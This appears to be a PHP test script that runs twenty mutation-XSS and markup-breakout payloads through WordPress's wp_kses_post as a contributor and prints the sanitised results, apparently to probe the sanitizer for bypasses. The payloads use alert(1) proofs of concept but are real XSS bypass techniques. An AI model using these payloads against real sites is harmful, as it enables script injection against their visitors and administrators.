<?php
// Emit kses_post output for a battery of mXSS payloads (contributor context).
$contrib=get_user_by('login','contributor'); wp_set_current_user($contrib->ID);
kses_remove_filters(); kses_init_filters();
$payloads = array(
 'style_img'      => '<style><style/><img src=x onerror=alert(1)>',
 'svg_style'      => '<svg><style>&lt;/style&gt;&lt;img src=x onerror=alert(1)&gt;</style></svg>',
 'noscript'       => '<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
 'title_break'    => '<title></title><img src=x onerror=alert(1)>',
 'textarea_break' => '<textarea></textarea><img src=x onerror=alert(1)>',
 'comment_mxss'   => '<!--><img src=x onerror=alert(1)>-->',
 'xmp_break'      => '<xmp></xmp><img src=x onerror=alert(1)>',
 'math_mtext'     => '<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>',
 'svg_foreign'    => '<svg><foreignObject><img src=x onerror=alert(1)></foreignObject></svg>',
 'a_attr_break'   => '<a title="&quot;&gt;&lt;img src=x onerror=alert(1)&gt;">z</a>',
 'entity_attr'    => '<img alt="&#34; onerror=&#34;alert(1)" src=x>',
 'noembed'        => '<noembed><img src=x onerror=alert(1)></noembed>',
 'select_break'   => '<select><option></option></select><img src=x onerror=alert(1)>',
 'iframe_srcdoc'  => '<iframe srcdoc="&lt;img src=x onerror=alert(1)&gt;"></iframe>',
 'style_expr'     => '<div style="width:expression(alert(1))">x</div>',
 'style_import'   => '<style>@import "javascript:alert(1)";</style>',
 'form_action'    => '<form action="javascript:alert(1)"><button>x</button></form>',
 'base_href'      => '<base href="javascript:alert(1)//">',
 'link_import'    => '<link rel="stylesheet" href="javascript:alert(1)">',
 'template_break' => '<template><img src=x onerror=alert(1)></template>',
);
$out = array();
foreach ($payloads as $k=>$p) { $out[$k] = wp_kses_post($p); }
echo json_encode($out);
